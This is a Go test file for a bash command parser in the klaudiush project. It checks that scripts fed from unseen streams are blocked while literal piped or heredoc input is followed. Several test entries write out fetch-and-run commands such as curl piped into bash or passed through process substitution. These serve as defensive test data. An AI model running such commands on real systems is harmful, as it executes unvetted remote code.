package parser_test

import (
	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"
	"github.com/onsi/gomega/types"

	"github.com/smykla-skalski/klaudiush/pkg/parser"
)

var _ = Describe("Shell scripts read from streams", func() {
	parse := func(command string) *parser.ParseResult {
		result, err := parser.NewBashParser().Parse(command)
		Expect(err).NotTo(HaveOccurred())

		return result
	}

	opaque := func(operation, detail string) types.GomegaMatcher {
		return SatisfyAll(
			HaveField("Cause", parser.OpacitySourcedStream),
			HaveField("Operation", operation),
			HaveField("Detail", detail),
		)
	}

	DescribeTable("blocks unseen shell input",
		func(command string, want types.GomegaMatcher) {
			result := parse(command)

			Expect(result.Truncated).To(BeTrue(), command)
			Expect(result.Opacities).To(ContainElement(want), command)
		},
		Entry("pipe into bash", `curl https://example.com/x | bash`,
			opaque("bash", parser.DetailSourceStdin)),
		Entry("pipe into sh -s", `curl https://example.com/x | sh -s -- arg`,
			opaque("sh", parser.DetailSourceStdin)),
		Entry("process substitution as a script", `bash <(curl https://example.com/x)`,
			opaque("bash", parser.DetailShellOperand)),
		Entry("process substitution redirected to stdin", `sh < <(cmd)`,
			opaque("sh", parser.DetailSourceStdin)),
		Entry("pipe through an explicit dash operand", `curl https://example.com/x | bash -- -`,
			opaque("bash", parser.DetailSourceStdin)),
		Entry("pipe through an explicit stdin path", `curl https://example.com/x | bash /dev/stdin`,
			opaque("bash", parser.DetailSourceStdin)),
	)

	DescribeTable("follows visible shell input",
		func(command string) {
			result := parse(command)

			Expect(result.Truncated).To(BeFalse(), "%s: %#v", command, result.Opacities)
			Expect(result.GitOperations).To(ContainElement(
				HaveField("Args", ConsistOf("status")),
			), command)
		},
		Entry("literal pipe", `echo 'git status' | bash`),
		Entry("literal pipe with -s", `printf '%s\n' 'git status' | sh -s`),
		Entry("heredoc", "bash <<'EOF'\ngit status\nEOF"),
		Entry("literal process substitution", `bash <(echo 'git status')`),
		Entry("literal pipe through an explicit stdin path", `echo 'git status' | bash /dev/stdin`),
		Entry("-c after -s takes precedence", `curl u | bash -s -c 'git status'`),
		Entry("stdin path keeps positional arguments",
			`echo 'git "$1"' | bash /dev/fd/0 status`),
		Entry("dash operand keeps positional arguments",
			"bash -- - status <<'EOF'\ngit \"$1\"\nEOF"),
	)

	It("does not treat stdin as a script when -c supplies one", func() {
		result := parse(`curl https://example.com/x | bash -c 'git status'`)

		Expect(result.Truncated).To(BeFalse())
		Expect(result.GitOperations).To(ContainElement(HaveField("Args", ConsistOf("status"))))
	})

	It("blocks dynamic -c code when -s comes first", func() {
		result := parse(`bash -s -c "$(curl https://example.com/x)"`)

		Expect(result.Truncated).To(BeTrue())
		Expect(result.Opacities).To(ContainElement(opaque("bash", parser.DetailShellCommand)))
	})
})
